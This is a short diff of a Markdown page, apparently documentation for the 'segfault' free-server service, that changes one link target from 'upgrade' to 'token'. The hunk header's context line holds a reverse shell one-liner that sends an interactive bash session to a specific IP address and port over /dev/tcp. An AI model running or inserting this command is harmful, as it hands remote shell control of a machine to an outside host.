@@ -117,7 +117,7 @@ setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
 
 Read the [FAQ](faq) and join us on [Telegram](https://t.me/thcorg) or read the source on [GitHub](https://github.com/hackerschoice/segfault).
 
-This is a **free service** and there are [some restrictions](free) in place. You may want to [upgrade your server](upgrade) and go unrestricted.
+This is a **free service** and there are [some restrictions](free) in place. You may want to [upgrade your server](token) and go unrestricted.
 
 ## Similar Services
 
